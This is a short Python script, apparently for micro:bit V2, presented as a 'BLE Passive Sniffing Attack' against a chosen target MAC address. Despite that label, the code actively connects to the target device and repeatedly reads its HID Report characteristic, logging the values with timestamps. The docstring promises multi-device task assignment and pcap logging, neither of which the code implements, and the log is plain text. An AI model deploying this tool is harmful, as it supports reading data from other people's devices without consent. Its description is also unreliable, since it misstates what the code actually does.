# microbit_ble_passive_sniffer.py

"""
BLE Passive Sniffing Attack for micro:bit V2 (Multi-Device Support)

This script passively listens to BLE traffic to capture unencrypted data packets.
- Detects available micro:bit devices and assigns tasks dynamically
- Sniffs BLE traffic (`--sniff <target_mac>`)
- Logs captured packets for later analysis (`--log <file>`)
- Runs all tasks sequentially if only one device is available

### Usage Examples:

1. Passively sniff BLE traffic from a target device:
   ```sh
   python microbit_ble_passive_sniffer.py --sniff AA:BB:CC:DD:EE:FF
   ```

2. Log captured packets for later analysis:
   ```sh
   python microbit_ble_passive_sniffer.py --log packets.pcap
   ```

Requirements:
- Micro:bit V2
- Python 3.x
- bleak library (`pip install bleak`)
"""

import asyncio
import datetime
from bleak import BleakScanner, BleakClient
import argparse

# Detect Connected Micro:bit Devices
async def detect_microbits():
    """Scans for connected micro:bit devices and returns their count."""
    devices = await BleakScanner.discover()
    microbits = [device.address for device in devices if "micro:bit" in (device.name or "").lower()]
    print(f"[+] Detected {len(microbits)} micro:bit devices.")
    return microbits

# BLE Passive Sniffing
async def ble_sniff(target_mac, log_file):
    """Passively listens to BLE packets from a target device."""
    print(f"[+] Starting BLE passive sniffing on {target_mac}...")
    captured_packets = []
    async with BleakClient(target_mac) as client:
        while True:
            try:
                data = await client.read_gatt_char("00002a4d-0000-1000-8000-00805f9b34fb")
                timestamp = datetime.datetime.now().isoformat()
                captured_packets.append(f"{timestamp} | {target_mac} | {data.hex()}")
                print(f"[+] Captured Packet: {data.hex()}")
                if log_file:
                    with open(log_file, "a") as f:
                        f.write(f"{timestamp} | {target_mac} | {data.hex()}\n")
            except Exception as e:
                print(f"[-] Error capturing packet: {e}")
            await asyncio.sleep(0.1)

# Argument Parser
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="BLE Passive Sniffing Attack for micro:bit V2")
    parser.add_argument("--sniff", metavar="target_mac", help="Sniff BLE traffic from a target device")
    parser.add_argument("--log", metavar="file", help="Log captured packets for analysis")
    
    args = parser.parse_args()
    loop = asyncio.get_event_loop()
    
    microbits = loop.run_until_complete(detect_microbits())
    num_microbits = len(microbits)
    
    if args.sniff:
        loop.run_until_complete(ble_sniff(args.sniff, args.log))
